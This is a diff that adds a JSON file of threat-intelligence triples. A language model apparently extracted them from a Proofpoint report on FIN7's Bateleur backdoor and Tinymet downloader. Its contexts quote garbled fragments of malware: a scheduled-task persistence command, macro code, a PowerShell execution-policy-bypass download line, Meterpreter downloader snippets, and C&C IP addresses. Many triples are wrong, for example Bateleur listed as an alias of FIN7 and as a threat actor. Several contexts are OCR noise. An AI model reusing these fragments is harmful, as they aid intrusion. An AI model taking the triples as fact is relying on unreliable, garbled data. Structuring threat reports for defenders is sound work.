@@ -1,0 +1,789 @@
+{
+  "metrics": {
+    "file_name": "FIN7_Carbanak threat actor unleashes Bateleur JScript backdoor _ Proofpoint US.pdf",
+    "model_used": "gemma2:9b",
+    "doc_sha256_id": "304c7097b1b527d9",
+    "num_pages": 11,
+    "num_sentences_total": 104,
+    "num_sentences_used": 58,
+    "num_raw_triples": 58,
+    "num_valid_triples": 32,
+    "num_suspicious_triples": 26,
+    "avg_triples_per_sentence": 1.0,
+    "rejection_stats": {
+      "bad_structure": 0,
+      "invalid_class_or_predicate": 26
+    },
+    "runtime_seconds": 167.5049386024475
+  },
+  "data": [
+    {
+      "context": "JULY 31, 2017  |  MATTHEW MESA, DARIEN HUSS Overview Proofpoint researchers have uncovered that the threat actor commonly referred to as FIN7 has added a new JScript backdoor called Bateleur and updated macros to its toolkit.",
+      "triple": [
+        {
+          "subject": {
+            "name": "FIN7",
+            "type": "ThreatActor"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "Bateleur",
+            "type": "Backdoor"
+          },
+          "evidence": {
+            "quote": "the threat actor commonly referred to as FIN7 has added a new JScript backdoor called Bateleur"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 1,
+        "id": "001",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "We have observed these new tools being used to target U.S.-based chain restaurants, although FIN7 has previously targeted hospitality organizations, retailers, merchant services, suppliers and others.",
+      "triple": [
+        {
+          "subject": {
+            "name": "tools",
+            "type": "Malware"
+          },
+          "predicate": "targets",
+          "object": {
+            "name": "U.S.-based chain restaurants",
+            "type": "Location"
+          },
+          "evidence": {
+            "quote": "these new tools being used to target U.S.-based chain restaurants"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 1,
+        "id": "002",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "[1], initially described by researchers at FireEye [2].",
+      "triple": [
+        {
+          "subject": {
+            "name": "[1]",
+            "type": "Unknown"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "initially described by researchers at FireEye [2]",
+            "type": "AttackPattern_LargeDescription"
+          },
+          "evidence": {
+            "quote": "initially described by researchers at FireEye [2]"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 1,
+        "id": "005",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "In addition, starting in early June, we observed this threat actor using macro documents to drop a previously undocumented JScript backdoor, which we have named 'Bateleur', instead of dropping their customary GGLDR payload.",
+      "triple": [
+        {
+          "subject": {
+            "name": "threat actor",
+            "type": "ThreatActor"
+          },
+          "predicate": "uses",
+          "object": {
+            "name": "macro documents",
+            "type": "Application"
+          },
+          "evidence": {
+            "quote": "using macro documents"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 1,
+        "id": "006",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "In other cases, when the message was sent from a Gmail account, the lure document instead claims 'This document is encrypted by Google Documents Protect Service' (Fig. 2).",
+      "triple": [
+        {
+          "subject": {
+            "name": "message",
+            "type": "Unknown"
+          },
+          "predicate": "targets",
+          "object": {
+            "name": "Gmail account",
+            "type": "EmailAddress"
+          },
+          "evidence": {
+            "quote": "sent from a Gmail account"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 2,
+        "id": "002",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": " Figure 2: Malicious 'Outlook' document lure (left) and 'Google' lure (right)",
+      "triple": [
+        {
+          "subject": {
+            "name": "Malicious",
+            "type": "Malware"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "'Outlook'",
+            "type": "EmailAddress"
+          },
+          "evidence": {
+            "quote": "Malicious 'Outlook'"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 3,
+        "id": "000",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "\"\"GoogleUpdateTaskMachineCorefh5evfbce5bhfd37\"\" /tr \"\"wscript.exe //b /e:",
+      "triple": [
+        {
+          "subject": {
+            "name": "GoogleUpdateTaskMachineCorefh5evfbce5bhfd37",
+            "type": "Filename"
+          },
+          "predicate": "targets",
+          "object": {
+            "name": "/tr",
+            "type": "Filepath"
+          },
+          "evidence": {
+            "quote": "GoogleUpdateTaskMachineCorefh5evfbce5bhfd37 /tr"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 3,
+        "id": "009",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "\"\"05:00\"\" /sd \"\"12/12/1990\"\" 1. Sleep for 3 seconds 2.",
+      "triple": [
+        {
+          "subject": {
+            "name": "Time",
+            "type": "Time"
+          },
+          "predicate": "indicates",
+          "object": {
+            "name": "05:00",
+            "type": "Time"
+          },
+          "evidence": {
+            "quote": "\"05:00\""
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 3,
+        "id": "013",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "The combined effect of these commands is to run Bateleur on the infected system in a roundabout manner in an attempt to evade detection.",
+      "triple": [
+        {
+          "subject": {
+            "name": "commands",
+            "type": "AttackPattern_SmallDescription"
+          },
+          "predicate": "targets",
+          "object": {
+            "name": "system",
+            "type": "System"
+          },
+          "evidence": {
+            "quote": "run Bateleur on the infected system"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 4,
+        "id": "002",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Figure 3: Macro from c91642c0a5a8781fff9fd400bff85b6715c96d8e17e2d2390c1771c683c7ead9 Sub armando( ) Dim izobi Dim vvajvic Dim vbsvvajvic Set gpeppa CreateObject(\"Scripting FileSysterObject\") Set ypolxa gpeppa.",
+      "triple": [
+        {
+          "subject": {
+            "name": "Sub",
+            "type": "AttackPattern_SmallDescription"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "armando( )",
+            "type": "Filename"
+          },
+          "evidence": {
+            "quote": "Sub armando( )"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 4,
+        "id": "003",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "[ezso [a [) {Sting Pototype X 'rs)if(typeof sting ];|*Ivar [ve , 'var pars oles GetSpedalF' '5, true);a Writeline( nuif];| *Ivar r (var 0; arguments' {coon 0 {var narg",
+      "triple": [
+        {
+          "subject": {
+            "name": "ezso",
+            "type": "Malware"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "[Sting Pototype X 'rs)if(typeof sting ];|*Ivar [ve , 'var pars oles GetSpedalF' '5, true);a Writeline( nuif];| *Ivar r (var 0; arguments' {coon 0 {var narg",
+            "type": "Unknown"
+          },
+          "evidence": {
+            "quote": "[ezso [a [) {Sting Pototype X 'rs)if(typeof sting ];|*Ivar [ve , 'var pars oles GetSpedalF' '5, true);a Writeline( nuif];| *Ivar r (var 0; arguments' {coon 0 {var narg"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 4,
+        "id": "010",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "[ozi , 'rdoqu , The malicious JScript has robust capabilities that include anti-sandbox functionality, anti-analysis (obfuscation), retrieval of infected system information, listing of running processes, execution of  custom commands and PowerShell scripts, loading of EXEs and DLLs, taking screenshots, uninstalling and updating itself, and possibly the ability to exVltrate passwords, although the latter requires an additional module from the command and control server (C&C).",
+      "triple": [
+        {
+          "subject": {
+            "name": "JScript",
+            "type": "Malware"
+          },
+          "predicate": "has",
+          "object": {
+            "name": "anti-sandbox functionality",
+            "type": "AttackPattern_SmallDescription"
+          },
+          "evidence": {
+            "quote": "anti-sandbox functionality"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 4,
+        "id": "011",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "\"wscript.exe //b /e:jscript C:\\Users\\[user account]\\AppData\\Local\\Temp\\{[hex]-[hex]-[hex]-[hex]-[hex]}\\debug.txt\" /sc minute /mo 5",
+      "triple": [
+        {
+          "subject": {
+            "name": "wscript.exe",
+            "type": "Application"
+          },
+          "predicate": "uses",
+          "object": {
+            "name": "//b /e:jscript C:\\Users\\[user account]\\AppData\\Local\\Temp\\{[hex]-[hex]-[hex]-[hex]-[hex]}debug.txt",
+            "type": "Filepath"
+          },
+          "evidence": {
+            "quote": "wscript.exe //b /e:jscript C:\\Users\\[user account]\\AppData\\Local\\Temp\\{[hex]-[hex]-[hex]-[hex]-[hex]}debug.txt"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 4,
+        "id": "014",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "uninstall Delete installation Vle and path and remove scheduled task",
+      "triple": [
+        {
+          "subject": {
+            "name": "Delete",
+            "type": "Malware"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "Vle",
+            "type": "Software"
+          },
+          "evidence": {
+            "quote": "uninstall Delete installation Vle"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 5,
+        "id": "003",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": " GoogleUpdateTaskMachineSystem Table 1: List of commands available in the Bateleur backdoor The Bateleur C&C protocol occurs over HTTPS and is fairly straightforward with no additional encoding or obfuscation.",
+      "triple": [
+        {
+          "subject": {
+            "name": "Bateleur",
+            "type": "Backdoor"
+          },
+          "predicate": "targets",
+          "object": {
+            "name": "HTTPS",
+            "type": "Protocol"
+          },
+          "evidence": {
+            "quote": "The Bateleur C&C protocol occurs over HTTPS"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 6,
+        "id": "000",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Bateleur uses HTTP POST requests with a URI of '/?page=wait' while the backdoor is waiting for instructions.",
+      "triple": [
+        {
+          "subject": {
+            "name": "Bateleur",
+            "type": "AttackPattern"
+          },
+          "predicate": "uses",
+          "object": {
+            "name": "HTTP POST requests with a URI of '/?page=wait'",
+            "type": "AttackPattern_SmallDescription"
+          },
+          "evidence": {
+            "quote": "Bateleur uses HTTP POST requests with a URI of '/?page=wait'"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 6,
+        "id": "001",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Content-Length: 39 Connection: Keep-Alive Host: 195.133.49.73 Cache-Control: no-cache version-1.0JSebid= &HTTP/1.1 200 OK Server nainx/1.10.2 Date: Content-Type text/html; charset-UTF-8 Connection: keep-alive Content-Length: 2942 powvershell.exe NoE NoP NonI ExecutionPolicy Bypass Sal a New Object iex(a Figure 6: Bateleur HTTP POST receiving command from C&C After each command the backdoor will respond with typically either an OK for many commands, or send the results back to the C&C with a Vnal POST request.",
+      "triple": [
+        {
+          "subject": {
+            "name": "powvershell.exe",
+            "type": "Application"
+          },
+          "predicate": "uses",
+          "object": {
+            "name": "Bateleur",
+            "type": "MalwareFamily"
+          },
+          "evidence": {
+            "quote": "After each command the backdoor will respond with typically either an OK for many commands, or send the results back to the C&C with a Vnal POST request."
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 7,
+        "id": "003",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "In less than one month, we have observed Bataleur jump from version 1.0 to 1.0.4.1; the newer version of the backdoor adds several new commands including the wexe , apowershell , and wpowershell (Table 1) that did not exist in version 1.0.",
+      "triple": [
+        {
+          "subject": {
+            "name": "Bataleur",
+            "type": "Malware"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "backdoor",
+            "type": "Backdoor"
+          },
+          "evidence": {
+            "quote": "the newer version of the backdoor"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 7,
+        "id": "005",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Attribution Proofpoint researchers have determined with a high degree of certainty that this backdoor is being used by the same group that is referred to as FIN7 by FireEye [3] and as Carbanak by TrustWave",
+      "triple": [
+        {
+          "subject": {
+            "name": "FIN7",
+            "type": "ThreatActor"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "Carbanak",
+            "type": "ThreatActor"
+          },
+          "evidence": {
+            "quote": "referred to as FIN7 by FireEye [3] and as Carbanak by TrustWave"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 7,
+        "id": "006",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Email Message/Campaign Similarity In June we observed similar messages separately delivering GGLDR and Bateleur to the same target, with some even sharing very similar or identical attachment names, subject lines, and/or sender addresses.",
+      "triple": [
+        {
+          "subject": {
+            "name": "GGLDR",
+            "type": "Malware"
+          },
+          "predicate": "targets",
+          "object": {
+            "name": "same target",
+            "type": "Unknown"
+          },
+          "evidence": {
+            "quote": "similar messages separately delivering GGLDR and Bateleur to the same target"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 7,
+        "id": "009",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": " A small Meterpreter downloader script, called Tinymet by the actor(s) (possibly inspired by [5]), has repeatedly been observed being utilized by this group at least as far back as 2016",
+      "triple": [
+        {
+          "subject": {
+            "name": "Meterpreter downloader script",
+            "type": "Application"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "Tinymet",
+            "type": "DomainName"
+          },
+          "evidence": {
+            "quote": "called Tinymet by the actor(s)"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 8,
+        "id": "000",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Figure 7: Beginning snippet from Tinymet downloaded by Bateleur SIP 185 25 48 186 SPort = 53 SvirtualAlloc snull SCreateThread Snull sWaitForsingleObject Snull SXORKEY 0x50 function XorByteArr { Param",
+      "triple": [
+        {
+          "subject": {
+            "name": "Tinymet",
+            "type": "Malware"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "Bateleur SIP 185 25 48 186",
+            "type": "DomainName"
+          },
+          "evidence": {
+            "quote": "Tinymet downloaded by Bateleur SIP 185 25 48 186"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 8,
+        "id": "003",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "8) which was used in at least one occasion (Fig. 9) to download a JScript version of the Tinymet Meterpreter downloader (Fig. 10).",
+      "triple": [
+        {
+          "subject": {
+            "name": "JScript",
+            "type": "Application"
+          },
+          "predicate": "uses",
+          "object": {
+            "name": "Tinymet Meterpreter downloader",
+            "type": "Downloader"
+          },
+          "evidence": {
+            "quote": "download a JScript version of the Tinymet Meterpreter downloader"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 8,
+        "id": "008",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "FIgure 9: GGLDR receiving Tinymet command from C&C (after decoding base64 with custom alphabet) cmd id: param:",
+      "triple": [
+        {
+          "subject": {
+            "name": "FIgure 9",
+            "type": "System"
+          },
+          "predicate": "indicates",
+          "object": {
+            "name": "Tinymet command",
+            "type": "CommandAndControl"
+          },
+          "evidence": {
+            "quote": "receiving Tinymet command from C&C"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 8,
+        "id": "012",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": " Figure 10: Snippet from Tinymet downloaded by GGLDR tinymet command if(officeBit() 64) { var SRV IP 188 165.44 .",
+      "triple": [
+        {
+          "subject": {
+            "name": "SRV",
+            "type": "DomainName"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "IP 188 165.44",
+            "type": "IPAddress"
+          },
+          "evidence": {
+            "quote": "SRV IP 188 165.44"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 9,
+        "id": "000",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "190\" var SRV PORT 53 Jelse{ var SRV IP 188 .",
+      "triple": [
+        {
+          "subject": {
+            "name": "190",
+            "type": "Unknown"
+          },
+          "predicate": "uses",
+          "object": {
+            "name": "SRV",
+            "type": "Protocol"
+          },
+          "evidence": {
+            "quote": "190\" var SRV PORT 53"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 9,
+        "id": "001",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "190\" var SRV PORT 53 var strTiny Const INVALID SOCKET Const WSADESCRIPTION LEN 256 Const XOR BYTE SRV IP Const Port SRV PORT",
+      "triple": [
+        {
+          "subject": {
+            "name": "SRV",
+            "type": "IPAddress"
+          },
+          "predicate": "uses",
+          "object": {
+            "name": "PORT",
+            "type": "Port"
+          },
+          "evidence": {
+            "quote": "SRV PORT"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 9,
+        "id": "003",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "We have also observed Tinymet delivered via the runps1 (Fig. 11) and runvbs (Fig. 12) commands, resulting in the same version of Tinymet downloaded by Bateleur (Fig. 13).",
+      "triple": [
+        {
+          "subject": {
+            "name": "Tinymet",
+            "type": "Malware"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "Bateleur",
+            "type": "ThreatActor"
+          },
+          "evidence": {
+            "quote": "resulting in the same version of Tinymet downloaded by Bateleur"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 9,
+        "id": "004",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "[Byte] SXorKey for(si-0; si ~It sByteArr.Length si++) { SByteArr[si] sByteArr[si] ~bxor SXorKey return sByteArr function Get-ProcAddress",
+      "triple": [
+        {
+          "subject": {
+            "name": "SXorKey",
+            "type": "SHA"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "function Get-ProcAddress",
+            "type": "Filename"
+          },
+          "evidence": {
+            "quote": "SXorKey for(si-0; si ~It sByteArr.Length si++) { SByteArr[si] sByteArr[si] ~bxor SXorKey return sByteArr function Get-ProcAddress"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 9,
+        "id": "011",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": " Figure 13: Snippet from decoded Tinymet downloaded by GGLDR runps1 and runvbs commands Password Grabber During our analysis we observed that the Powershell password grabber utilized by Bateleur contained an identical DLL (stealer_component_reu.dll - 8c00afd815355a00c55036e5d18482f730d5e71a9f83fe23c7a1c0d9007ced5a) as the one we found embedded in a powershell contained in recent GGLDR samples.",
+      "triple": [
+        {
+          "subject": {
+            "name": "Powershell password grabber",
+            "type": "Application"
+          },
+          "predicate": "uses",
+          "object": {
+            "name": "stealer_component_reu.dll - 8c00afd815355a00c55036e5d18482f730d5e71a9f83fe23c7a1c0d9007ced5a",
+            "type": "Malware"
+          },
+          "evidence": {
+            "quote": "Powershell password grabber utilized by Bateleur contained an identical DLL (stealer_component_reu.dll - 8c00afd815355a00c55036e5d18482f730d5e71a9f83fe23c7a1c0d9007ced5a"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 10,
+        "id": "000",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": " Bateleur C&C 195.133.48[.]65:443 195.133.49[.]73:443 185.154.53[.]65:443 188.120.241[.]27:443 176.53.25[.]12:443 5.200.53[.]61:443 Tinymet C&C 185.25.48[.]186:53 46.166.168[.]213:443 188.165.44[.]190:53 ET and ETPRO Suricata/Snort Coverage 2825129,ETPRO TROJAN Carbanak VBS/GGLDR v2 Checkin 2825130,ETPRO TROJAN Carbanak VBS/GGLDR v2 CnC Beacon 2826201,ETPRO TROJAN Carbanak VBS/GGLDR v2 CnC Beacon 2 2826592,ETPRO TROJAN Carbanak VBS/GGLDR v3 CnC Beacon 2826631,ETPRO TROJAN Carbanak/FIN7 Bateleur SSL CertiVcate Detected 2826167,ETPRO TROJAN Carbanak/FIN7 Tinymet Downloader Receiving Payload",
+      "triple": [
+        {
+          "subject": {
+            "name": "Bateleur C&C",
+            "type": "IPAddress"
+          },
+          "predicate": "communicatesWith",
+          "object": {
+            "name": "195.133.48[.]65:443 195.133.49[.]73:443 185.154.53[.]65:443 188.120.241[.]27:443 176.53.25[.]12:443 5.200.53[.]61:443",
+            "type": "IPAddress"
+          },
+          "evidence": {
+            "quote": "Bateleur C&C 195.133.48[.]65:443 195.133.49[.]73:443 185.154.53[.]65:443 188.120.241[.]27:443 176.53.25[.]12:443 5.200.53[.]61:443"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 11,
+        "id": "000",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "2826674,ETPRO TROJAN Carbanak/FIN7 Bateleur CnC Beacon Previous Blog Post Next Blog Post",
+      "triple": [
+        {
+          "subject": {
+            "name": "2826674",
+            "type": "MalwareFamily"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "ETPRO TROJAN",
+            "type": "Malware"
+          },
+          "evidence": {
+            "quote": "2826674,ETPRO TROJAN"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 11,
+        "id": "001",
+        "source": "TEXT"
+      }
+    }
+  ]
+}
